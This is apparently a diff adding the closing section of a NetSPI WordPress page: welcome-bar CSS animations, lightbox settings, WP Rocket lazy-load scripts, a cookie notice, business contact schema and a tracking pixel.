+	.mysticky-welcomebar-entry-effect-none {
+		display: none;
+	}
+	.mysticky-welcomebar-fixed .mysticky-welcomebar-content p a,
+	.mysticky-welcomebar-fixed .mysticky-welcomebar-content p {
+		color: #ffffff;
+		font-size: 20px;
+		margin: 0;
+		padding: 0;
+		line-height: 1.2;
+		font-family: inherit;
+		font-weight: 400;
+	}
+	.mysticky-welcomebar-fixed .mysticky-welcomebar-btn {
+		padding-left: 30px;
+		display: none;
+		line-height: 1;
+	}
+	.mysticky-welcomebar-fixed.mysticky-welcomebar-btn-desktop .mysticky-welcomebar-btn {
+		display: block;
+	}
+	.mysticky-welcomebar-fixed .mysticky-welcomebar-btn a {
+		background-color: #000000;
+		font-family: inherit;
+		color: #ffffff;
+		border-radius: 4px;
+		text-decoration: none;
+		display: inline-block;
+		vertical-align: top;
+		line-height: 1.2;
+		font-size: 20px;
+		font-weight: 400;
+		padding: 5px 20px;
+		white-space: nowrap;
+	}
+	.mysticky-welcomebar-fixed .mysticky-welcomebar-btn a:hover {
+		/*opacity: 0.7;*/
+		-moz-box-shadow: 1px 2px 4px rgba(0, 0, 0,0.5);
+		-webkit-box-shadow: 1px 2px 4px rgba(0, 0, 0, 0.5);
+		box-shadow: 1px 2px 4px rgba(0, 0, 0, 0.5);
+	}
+	.mysticky-welcomebar-fixed .mysticky-welcomebar-close {
+		display: none;
+		vertical-align: top;
+		width: 30px;
+		height: 30px;
+		text-align: center;
+		line-height: 30px;
+		border-radius: 5px;
+		color: #000;
+		position: absolute;
+		top: 5px;
+		right: 10px;
+		outline: none;
+		font-family: Lato; 
+		text-decoration: none;
+		text-shadow: 0 0 0px #fff;
+		-webkit-transition: all 0.5s ease 0s;
+		-moz-transition: all 0.5s ease 0s;
+		transition: all 0.5s ease 0s;
+		-webkit-transform-origin: 50% 50%;
+		-moz-transform-origin: 50% 50%;
+		transform-origin: 50% 50%;
+	}
+	.mysticky-welcomebar-fixed .mysticky-welcomebar-close:hover {
+		opacity: 1;
+		-webkit-transform: rotate(180deg);
+		-moz-transform: rotate(180deg);
+		transform: rotate(180deg);
+	}
+	.mysticky-welcomebar-fixed .mysticky-welcomebar-close span.dashicons {
+		font-size: 27px;
+	}
+	.mysticky-welcomebar-fixed.mysticky-welcomebar-showx-desktop .mysticky-welcomebar-close {
+		display: inline-block;
+	}	
+	
+	/* Animated Buttons */
+		.mysticky-welcomebar-btn a {
+			-webkit-animation-duration: 1s;
+			animation-duration: 1s;
+		}
+		@-webkit-keyframes flash {
+			from,
+			50%,
+			to {
+				opacity: 1;
+			}
+
+			25%,
+			75% {
+				opacity: 0;
+			}
+		}
+		@keyframes flash {
+			from,
+			50%,
+			to {
+				opacity: 1;
+			}
+
+			25%,
+			75% {
+				opacity: 0;
+			}
+		}
+		.mysticky-welcomebar-attention-flash.animation-start .mysticky-welcomebar-btn a {
+			-webkit-animation-name: flash;
+			animation-name: flash;
+		}
+		
+		@keyframes shake {
+			from,
+			to {
+				-webkit-transform: translate3d(0, 0, 0);
+				transform: translate3d(0, 0, 0);
+			}
+
+			10%,
+			30%,
+			50%,
+			70%,
+			90% {
+				-webkit-transform: translate3d(-10px, 0, 0);
+				transform: translate3d(-10px, 0, 0);
+			}
+
+			20%,
+			40%,
+			60%,
+			80% {
+				-webkit-transform: translate3d(10px, 0, 0);
+				transform: translate3d(10px, 0, 0);
+			}
+		}
+
+		.mysticky-welcomebar-attention-shake.animation-start .mysticky-welcomebar-btn a {
+			-webkit-animation-name: shake;
+			animation-name: shake;
+		}
+		
+		@-webkit-keyframes swing {
+			20% {
+				-webkit-transform: rotate3d(0, 0, 1, 15deg);
+				transform: rotate3d(0, 0, 1, 15deg);
+			}
+
+			40% {
+				-webkit-transform: rotate3d(0, 0, 1, -10deg);
+				transform: rotate3d(0, 0, 1, -10deg);
+			}
+
+			60% {
+				-webkit-transform: rotate3d(0, 0, 1, 5deg);
+				transform: rotate3d(0, 0, 1, 5deg);
+			}
+
+			80% {
+				-webkit-transform: rotate3d(0, 0, 1, -5deg);
+				transform: rotate3d(0, 0, 1, -5deg);
+			}
+	
+			to {
+				-webkit-transform: rotate3d(0, 0, 1, 0deg);
+				transform: rotate3d(0, 0, 1, 0deg);
+			}
+		}
+
+		@keyframes swing {
+			20% {
+				-webkit-transform: rotate3d(0, 0, 1, 15deg);
+				transform: rotate3d(0, 0, 1, 15deg);
+			}
+
+			40% {
+				-webkit-transform: rotate3d(0, 0, 1, -10deg);
+				transform: rotate3d(0, 0, 1, -10deg);
+			}
+
+			60% {
+				-webkit-transform: rotate3d(0, 0, 1, 5deg);
+				transform: rotate3d(0, 0, 1, 5deg);
+			}
+
+			80% {
+				-webkit-transform: rotate3d(0, 0, 1, -5deg);
+				transform: rotate3d(0, 0, 1, -5deg);
+			}
+
+			to {
+				-webkit-transform: rotate3d(0, 0, 1, 0deg);
+				transform: rotate3d(0, 0, 1, 0deg);
+			}
+		}
+
+		.mysticky-welcomebar-attention-swing.animation-start .mysticky-welcomebar-btn a {
+			-webkit-transform-origin: top center;
+			transform-origin: top center;
+			-webkit-animation-name: swing;
+			animation-name: swing;
+		}
+		
+		@-webkit-keyframes tada {
+			from {
+				-webkit-transform: scale3d(1, 1, 1);
+				transform: scale3d(1, 1, 1);
+			}
+
+			10%,
+			20% {
+				-webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
+				transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
+			}
+
+			30%,
+			50%,
+			70%,
+			90% {
+				-webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
+				transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
+			}
+
+			40%,
+			60%,
+			80% {
+				-webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
+				transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
+			}
+
+			to {
+				-webkit-transform: scale3d(1, 1, 1);
+				transform: scale3d(1, 1, 1);
+			}
+		}
+
+		@keyframes tada {
+			from {
+				-webkit-transform: scale3d(1, 1, 1);
+				transform: scale3d(1, 1, 1);
+			}
+
+			10%,
+			20% {
+				-webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
+				transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);
+			}
+
+			30%,
+			50%,
+			70%,
+			90% {
+				-webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
+				transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);
+			}
+
+			40%,
+			60%,
+			80% {
+				-webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
+				transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);
+			}
+
+			to {
+				-webkit-transform: scale3d(1, 1, 1);
+				transform: scale3d(1, 1, 1);
+			}
+		}
+
+		.mysticky-welcomebar-attention-tada.animation-start .mysticky-welcomebar-btn a {
+			-webkit-animation-name: tada;
+			animation-name: tada;
+		}
+		
+		@-webkit-keyframes heartBeat {
+			0% {
+				-webkit-transform: scale(1);
+				transform: scale(1);
+			}
+
+			14% {
+				-webkit-transform: scale(1.3);
+				transform: scale(1.3);
+			}
+
+			28% {
+				-webkit-transform: scale(1);
+				transform: scale(1);
+			}
+
+			42% {
+				-webkit-transform: scale(1.3);
+				transform: scale(1.3);
+			}
+
+			70% {
+				-webkit-transform: scale(1);
+				transform: scale(1);
+			}
+		}
+
+		@keyframes heartBeat {
+			0% {
+				-webkit-transform: scale(1);
+				transform: scale(1);
+			}
+
+			14% {
+				-webkit-transform: scale(1.3);
+				transform: scale(1.3);
+			}
+
+			28% {
+				-webkit-transform: scale(1);
+				transform: scale(1);
+			}
+
+			42% {
+				-webkit-transform: scale(1.3);
+				transform: scale(1.3);
+			}
+
+			70% {
+				-webkit-transform: scale(1);
+				transform: scale(1);
+			}
+		}
+
+		.mysticky-welcomebar-attention-heartbeat.animation-start .mysticky-welcomebar-btn a {
+		  -webkit-animation-name: heartBeat;
+		  animation-name: heartBeat;
+		  -webkit-animation-duration: 1.3s;
+		  animation-duration: 1.3s;
+		  -webkit-animation-timing-function: ease-in-out;
+		  animation-timing-function: ease-in-out;
+		}
+		
+		@-webkit-keyframes wobble {
+			from {
+				-webkit-transform: translate3d(0, 0, 0);
+				transform: translate3d(0, 0, 0);
+			}
+
+			15% {
+				-webkit-transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
+				transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
+			}
+
+			30% {
+				-webkit-transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
+				transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
+			}
+
+			45% {
+				-webkit-transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
+				transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
+			}
+
+			60% {
+				-webkit-transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
+				transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
+			}
+
+			75% {
+				-webkit-transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
+				transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
+			}
+
+			to {
+				-webkit-transform: translate3d(0, 0, 0);
+				transform: translate3d(0, 0, 0);
+			}
+		}
+
+		@keyframes wobble {
+			from {
+				-webkit-transform: translate3d(0, 0, 0);
+				transform: translate3d(0, 0, 0);
+			}
+
+			15% {
+				-webkit-transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
+				transform: translate3d(-25%, 0, 0) rotate3d(0, 0, 1, -5deg);
+			}
+
+			30% {
+				-webkit-transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
+				transform: translate3d(20%, 0, 0) rotate3d(0, 0, 1, 3deg);
+			}
+
+			45% {
+				-webkit-transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
+				transform: translate3d(-15%, 0, 0) rotate3d(0, 0, 1, -3deg);
+			}
+
+			60% {
+				-webkit-transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
+				transform: translate3d(10%, 0, 0) rotate3d(0, 0, 1, 2deg);
+			}
+
+			75% {
+				-webkit-transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
+				transform: translate3d(-5%, 0, 0) rotate3d(0, 0, 1, -1deg);
+			}
+
+			to {
+				-webkit-transform: translate3d(0, 0, 0);
+				transform: translate3d(0, 0, 0);
+			}
+		}
+		
+		.mysticky-welcomebar-attention-wobble.animation-start .mysticky-welcomebar-btn a {
+			-webkit-animation-name: wobble;
+			animation-name: wobble;
+		}
+		@media only screen and (min-width: 768px) {
+			.mysticky-welcomebar-display-desktop.mysticky-welcomebar-entry-effect-fade.entry-effect {
+				opacity: 1;
+			}
+			.mysticky-welcomebar-display-desktop.mysticky-welcomebar-entry-effect-none.entry-effect {
+				display: block;
+			}
+			.mysticky-welcomebar-display-desktop.mysticky-welcomebar-position-top.mysticky-welcomebar-fixed ,
+			.mysticky-welcomebar-display-desktop.mysticky-welcomebar-position-top.mysticky-welcomebar-entry-effect-slide-in.entry-effect.mysticky-welcomebar-fixed {
+				top: 0;			
+			}
+			.mysticky-welcomebar-display-desktop.mysticky-welcomebar-position-bottom.mysticky-welcomebar-fixed ,
+			.mysticky-welcomebar-display-desktop.mysticky-welcomebar-position-bottom.mysticky-welcomebar-entry-effect-slide-in.entry-effect.mysticky-welcomebar-fixed {
+				bottom: 0;
+			}	
+		}
+		@media only screen and (max-width: 767px) {
+			.mysticky-welcomebar-display-mobile.mysticky-welcomebar-entry-effect-fade.entry-effect {
+				opacity: 1;
+			}
+			.mysticky-welcomebar-display-mobile.mysticky-welcomebar-entry-effect-none.entry-effect {
+				display: block;
+			}
+			.mysticky-welcomebar-display-mobile.mysticky-welcomebar-position-top.mysticky-welcomebar-fixed ,
+			.mysticky-welcomebar-display-mobile.mysticky-welcomebar-position-top.mysticky-welcomebar-entry-effect-slide-in.entry-effect.mysticky-welcomebar-fixed {
+				top: 0;
+			}
+			.mysticky-welcomebar-display-mobile.mysticky-welcomebar-position-bottom.mysticky-welcomebar-fixed ,
+			.mysticky-welcomebar-display-mobile.mysticky-welcomebar-position-bottom.mysticky-welcomebar-entry-effect-slide-in.entry-effect.mysticky-welcomebar-fixed {
+				bottom: 0;
+			}
+			.mysticky-welcomebar-fixed.mysticky-welcomebar-showx-desktop .mysticky-welcomebar-close {
+				display: none;
+			}
+			.mysticky-welcomebar-fixed.mysticky-welcomebar-showx-mobile .mysticky-welcomebar-close {
+				display: inline-block;
+			}
+			.mysticky-welcomebar-fixed.mysticky-welcomebar-btn-desktop .mysticky-welcomebar-btn {
+				display: none;
+			}
+			.mysticky-welcomebar-fixed.mysticky-welcomebar-btn-mobile .mysticky-welcomebar-btn {
+				display: block;
+			}
+		}
+		@media only screen and (max-width: 480px) {
+			.mysticky-welcomebar-fixed-wrap {
+				padding: 15px 36px 35px 10px;
+			}
+			.mysticky-welcomebar-fixed .mysticky-welcomebar-btn {
+				padding-left: 10px;
+			}
+			.mysticky-welcomebar-fixed .mysticky-welcomebar-close {
+				right: 7px;
+			}
+		}
+	</style>
+	<div id="wonderpluginlightbox_options" data-skinsfoldername="skins/default/"  data-jsfolder="https://www.netspi.com/wp-content/plugins/wonderplugin-lightbox/engine/" data-autoslide="false" data-showall="false" data-slideinterval="5000" data-showtimer="true" data-timerposition="bottom" data-timerheight="2" data-timercolor="#dc572e" data-timeropacity="1" data-navarrowspos="inside" data-closepos="topright" data-enteranimation="bounceIn" data-exitanimation="" data-showplaybutton="false" data-alwaysshownavarrows="false" data-bordersize="8" data-showtitleprefix="false" data-responsive="true" data-fullscreenmode="false" data-fullscreentextoutside="true" data-closeonoverlay="true" data-videohidecontrols="false" data-mutevideo="false" data-nativehtml5controls="false" data-titlestyle="bottom" data-imagepercentage="75" data-enabletouchswipe="true" data-autoplay="true" data-html5player="true" data-overlaybgcolor="#000" data-overlayopacity="0.8" data-defaultvideovolume="1" data-bgcolor="" data-borderradius="0" data-thumbwidth="96" data-thumbheight="72" data-thumbtopmargin="12" data-thumbbottommargin="12" data-barheight="64" data-showtitle="true" data-titleprefix="%NUM / %TOTAL" data-titlebottomcss="color:#333; font-size:14px; font-family:Armata,sans-serif,Arial; overflow:hidden; text-align:left;" data-showdescription="true" data-descriptionbottomcss="color:#333; font-size:12px; font-family:Arial,Helvetica,sans-serif; overflow:hidden; text-align:left; margin:4px 0px 0px; padding: 0px;" data-titleinsidecss="color:#fff; font-size:16px; font-family:Arial,Helvetica,sans-serif; overflow:hidden; text-align:left;" data-descriptioninsidecss="color:#fff; font-size:12px; font-family:Arial,Helvetica,sans-serif; overflow:hidden; text-align:left; margin:4px 0px 0px; padding: 0px;" data-titleoutsidecss="color:#fff; font-size:18px; font-family:Arial,Helvetica,sans-serif; overflow:hidden; text-align:center; margin: 8px;" data-descriptionoutsidecss="color:#fff; font-size:14px; font-family:Arial,Helvetica,sans-serif; overflow:hidden; text-align:center; margin:8px; padding: 0px;" data-videobgcolor="#000" data-html5videoposter="" data-responsivebarheight="false" data-smallscreenheight="415" data-barheightonsmallheight="48" data-notkeepratioonsmallheight="false" data-showsocial="false" data-socialposition="position:absolute;top:100%;right:0;" data-socialpositionsmallscreen="position:absolute;top:100%;right:0;left:0;" data-socialdirection="horizontal" data-socialbuttonsize="32" data-socialbuttonfontsize="18" data-socialrotateeffect="true" data-showfacebook="true" data-showtwitter="true" data-showpinterest="true" data-bordertopmargin="48" data-shownavigation="true" data-navbgcolor="rgba(0,0,0,0.2)" data-shownavcontrol="true" data-hidenavdefault="false" data-hidenavigationonmobile="false" data-hidenavigationonipad="false" data-wonderplugin-lightbox-options="bc17c2edab" data-_wp_http_referer="/wp-admin/admin.php?page=wonderplugin_lightbox_show_options" style="display:none;"></div>        
+        
+<script id='mystickymenu-js-extra'>
+var option = {"mystickyClass":".navbar","activationHeight":"0","disableWidth":"0","disableLargeWidth":"0","adminBar":"false","device_desktop":"1","device_mobile":"1","mystickyTransition":"fade","mysticky_disable_down":"false"};
+</script>
+
+
+
+<script src='https://www.netspi.com/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=7.4.4' id='wp-polyfill-js'></script>
+
+<script src='https://www.netspi.com/wp-includes/js/dist/hooks.min.js?ver=50e23bed88bcb9e6e14023e9961698c1' id='wp-hooks-js'></script>
+<script src='https://www.netspi.com/wp-includes/js/dist/i18n.min.js?ver=db9a9a37da262883343e941c3731bc67' id='wp-i18n-js'></script>
+
+<script id='password-strength-meter-js-extra'>
+var pwsL10n = {"unknown":"Password strength unknown","short":"Very weak","bad":"Weak","good":"Medium","strong":"Strong","mismatch":"Mismatch"};
+</script>
+
+
+<script id='ppress-frontend-script-js-extra'>
+var pp_ajax_form = {"ajaxurl":"https:\/\/www.netspi.com\/wp-admin\/admin-ajax.php","confirm_delete":"Are you sure?","deleting_text":"Deleting...","deleting_error":"An error occurred. Please try again.","nonce":"2d155c98a9","disable_ajax_form":"false"};
+</script>
+
+
+
+
+
+<script id='rocket-browser-checker-js-after'>
+"use strict";var _createClass=function(){function defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,descriptor.key,descriptor)}}return function(Constructor,protoProps,staticProps){return protoProps&&defineProperties(Constructor.prototype,protoProps),staticProps&&defineProperties(Constructor,staticProps),Constructor}}();function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}var RocketBrowserCompatibilityChecker=function(){function RocketBrowserCompatibilityChecker(options){_classCallCheck(this,RocketBrowserCompatibilityChecker),this.passiveSupported=!1,this._checkPassiveOption(this),this.options=!!this.passiveSupported&&options}return _createClass(RocketBrowserCompatibilityChecker,[{key:"_checkPassiveOption",value:function(self){try{var options={get passive(){return!(self.passiveSupported=!0)}};window.addEventListener("test",null,options),window.removeEventListener("test",null,options)}catch(err){self.passiveSupported=!1}}},{key:"initRequestIdleCallback",value:function(){!1 in window&&(window.requestIdleCallback=function(cb){var start=Date.now();return setTimeout(function(){cb({didTimeout:!1,timeRemaining:function(){return Math.max(0,50-(Date.now()-start))}})},1)}),!1 in window&&(window.cancelIdleCallback=function(id){return clearTimeout(id)})}},{key:"isDataSaverModeOn",value:function(){return"connection"in navigator&&!0===navigator.connection.saveData}},{key:"supportsLinkPrefetch",value:function(){var elem=document.createElement("link");return elem.relList&&elem.relList.supports&&elem.relList.supports("prefetch")&&window.IntersectionObserver&&"isIntersecting"in IntersectionObserverEntry.prototype}},{key:"isSlowConnection",value:function(){return"connection"in navigator&&"effectiveType"in navigator.connection&&("2g"===navigator.connection.effectiveType||"slow-2g"===navigator.connection.effectiveType)}}]),RocketBrowserCompatibilityChecker}();
+</script>
+<script id='rocket-delay-js-js-after'>
+(function() {
+"use strict";var e=function(){function n(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}return function(e,t,r){return t&&n(e.prototype,t),r&&n(e,r),e}}();function n(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}var t=function(){function r(e,t){n(this,r),this.attrName="data-rocketlazyloadscript",this.browser=t,this.options=this.browser.options,this.triggerEvents=e,this.userEventListener=this.triggerListener.bind(this)}return e(r,[{key:"init",value:function(){this._addEventListener(this)}},{key:"reset",value:function(){this._removeEventListener(this)}},{key:"_addEventListener",value:function(t){this.triggerEvents.forEach(function(e){return window.addEventListener(e,t.userEventListener,t.options)})}},{key:"_removeEventListener",value:function(t){this.triggerEvents.forEach(function(e){return window.removeEventListener(e,t.userEventListener,t.options)})}},{key:"_loadScriptSrc",value:function(){var r=this,e=document.querySelectorAll("script["+this.attrName+"]");0!==e.length&&Array.prototype.slice.call(e).forEach(function(e){var t=e.getAttribute(r.attrName);e.setAttribute("src",t),e.removeAttribute(r.attrName)}),this.reset()}},{key:"triggerListener",value:function(){this._loadScriptSrc(),this._removeEventListener(this)}}],[{key:"run",value:function(){RocketBrowserCompatibilityChecker&&new r(["keydown","mouseover","touchmove","touchstart","wheel"],new RocketBrowserCompatibilityChecker({passive:!0})).init()}}]),r}();t.run();
+}());
+</script>
+<script id='netspi-js-js-extra'>
+var netspi_frontajax = {"ajaxurl":"https:\/\/www.netspi.com\/wp-admin\/admin-ajax.php"};
+</script>
+
+
+
+
+
+
+<script id='megamenu-js-extra'>
+var megamenu = {"timeout":"300","interval":"100"};
+</script>
+
+
+		<!-- Cookie Notice plugin v2.0.4 -->
+		<div id="cookie-notice" role="banner" class="cookie-notice-hidden cookie-revoke-hidden cn-position-bottom" aria-label="Cookie Notice" style="background-color: rgba(50,50,58,1);"><div class="cookie-notice-container" style="color: #fff;"><span id="cn-notice-text" class="cn-text-container">We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.</span><span id="cn-notice-buttons" class="cn-buttons-container"><a href="#" id="cn-accept-cookie" data-cookie-set="accept" class="cn-set-cookie cn-button bootstrap" aria-label="Ok">Ok</a></span><a href="javascript:void(0);" id="cn-close-notice" data-cookie-set="accept" class="cn-close-icon" aria-label="Ok"></a></div>
+			
+		</div>
+		<!-- / Cookie Notice plugin --><script>window.lazyLoadOptions={elements_selector:"img[data-lazy-src],.rocket-lazyload,iframe[data-lazy-src]",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,callback_loaded:function(element){if(element.tagName==="IFRAME"&&element.dataset.rocketLazyload=="fitvidscompatible"){if(element.classList.contains("lazyloaded")){if(typeof window.jQuery!="undefined"){if(jQuery.fn.fitVids){jQuery(element).parent().fitVids()}}}}}};window.addEventListener('LazyLoad::Initialized',function(e){var lazyLoadInstance=e.detail.instance;if(window.MutationObserver){var observer=new MutationObserver(function(mutations){var image_count=0;var iframe_count=0;var rocketlazy_count=0;mutations.forEach(function(mutation){for(i=0;i<mutation.addedNodes.length;i++){if(typeof mutation.addedNodes[i].getElementsByTagName!=='function'){continue}
+if(typeof mutation.addedNodes[i].getElementsByClassName!=='function'){continue}
+images=mutation.addedNodes[i].getElementsByTagName('img');is_image=mutation.addedNodes[i].tagName=="IMG";iframes=mutation.addedNodes[i].getElementsByTagName('iframe');is_iframe=mutation.addedNodes[i].tagName=="IFRAME";rocket_lazy=mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');image_count+=images.length;iframe_count+=iframes.length;rocketlazy_count+=rocket_lazy.length;if(is_image){image_count+=1}
+if(is_iframe){iframe_count+=1}}});if(image_count>0||iframe_count>0||rocketlazy_count>0){lazyLoadInstance.update()}});var b=document.getElementsByTagName("body")[0];var config={childList:!0,subtree:!0};observer.observe(b,config)}},!1)</script><script data-no-minify="1" async src="https://www.netspi.com/wp-content/plugins/wp-rocket/assets/js/lazyload/16.1/lazyload.min.js"></script>  
+
+<a href="#" id="scroll" style="display: none;"><span></span></a>
+
+<script type="application/ld+json">
+    {
+    "@context": "https://schema.org",
+    "@type": "LocalBusiness",
+	"address": {
+		"@type": "PostalAddress",
+		"streetAddress": "800 Washington Ave N Suite 670",
+		"addressLocality": "Minneapolis",
+		"addressRegion": "MN",
+		"postalCode": "55401",
+		"addressCountry": "USA"
+	},
+	"has_map": "",
+	"geo": {
+		"@type": "GeoCoordinates",
+		"latitude": 44.989490,
+		"longitude": -93.278630	},    
+	"name": "NetSPI",
+	"openingHours": [ ],
+	"telephone": "612.465.8880",
+	"email": "info@netspi.com",
+	"url": "https://www.netspi.com",
+	"image": "https://www.netspi.com/wp-content/uploads/2021/01/head-logo-1.svg",
+	"legalName": "NetSPI",
+	"priceRange": ""
+    }
+</script>
+
+
+
+
+<noscript>
+<img src="https://ws.zoominfo.com/pixel/Fa33QMviCG56ZRDkI7hZ"
+width="1" height="1" style="display: none;" />
+</noscript>
+<script src="https://www.netspi.com/wp-content/cache/min/1/f9c34870620bdf580437295457038679.js" data-minify="1"></script></body>
+</html>
+<!-- This website is like a Rocket, isn't it? Performance optimized by WP Rocket. Learn more: https://wp-rocket.me -->
